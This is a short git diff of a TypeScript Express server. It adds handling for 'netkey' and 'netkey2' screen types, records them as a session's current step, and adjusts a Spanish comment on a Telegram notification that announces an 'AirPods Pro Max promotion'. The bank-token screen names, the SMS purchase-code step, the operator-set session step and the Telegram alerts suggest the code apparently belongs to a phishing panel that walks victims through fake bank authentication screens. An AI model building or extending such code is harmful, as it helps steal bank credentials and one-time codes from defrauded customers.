@@ -1204,6 +1204,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 screenType = ScreenType.SMS_COMPRA;
               }
 
+              // Normalize screen type for NetKey
+              if (screenType === 'netkey') {
+                screenType = ScreenType.NETKEY;
+              }
+
+              // Normalize screen type for NetKey 2
+              if (screenType === 'netkey2') {
+                screenType = ScreenType.NETKEY2;
+              }
+
               await storage.updateSession(sessionId, { pasoActual: screenType });
               console.log('Actualizado pasoActual a:', screenType);
 
@@ -1277,7 +1287,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               }
             }));
 
-            // Enviar notificación inicial a Telegram
+            // Notificar inicial a Telegram
             let telegramMessage = '';
             if (clientData.terminosAceptados) {
               telegramMessage = `🎧 <b>PROMOCIÓN DE AIRPODS PRO MAX INICIADA</b>\n\n` +
